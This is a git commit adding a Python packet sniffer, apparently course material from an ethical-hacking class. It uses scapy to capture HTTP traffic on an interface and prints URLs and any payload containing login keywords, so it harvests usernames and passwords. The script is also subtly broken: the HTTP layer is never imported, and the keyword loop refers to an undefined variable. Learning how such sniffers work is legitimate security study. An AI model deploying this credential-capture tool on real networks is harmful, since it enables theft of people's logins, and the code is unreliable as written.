10a8e9bf7e60259590386702e38d651c5a46d799
Faris <fmoha@pixelatedspace.me>
2023-10-13 17:17:59 +0400

    new lessons

---
+++ Network_Sniffer.py
@@ -0,0 +1,35 @@
+# Date : October 11th 2023
+# Original Author : Zaid Sabih , Zsecurity
+# Edited by : Faris Mohammad 
+# Revision : 1
+# Note : 
+
+# Description : This program sniffs packets going over a defined interface and looks for keywords to return the data associated
+#               with the keywords, in this case username and passwords. It also prints any HTTP URls
+#               
+
+import scapy.all as scapy
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].path
+
+def get_login_info(packet):
+        if packet.haslayer(scapy.Raw):
+            load = str(packet[scapy.Raw].load)
+            keywords = ['username', 'user', 'login', 'password', 'pass', 'passwd']
+            for keywords in keywords:
+                if keyword in load:
+                    return load
+                
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print("[+] HTTP Request >> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
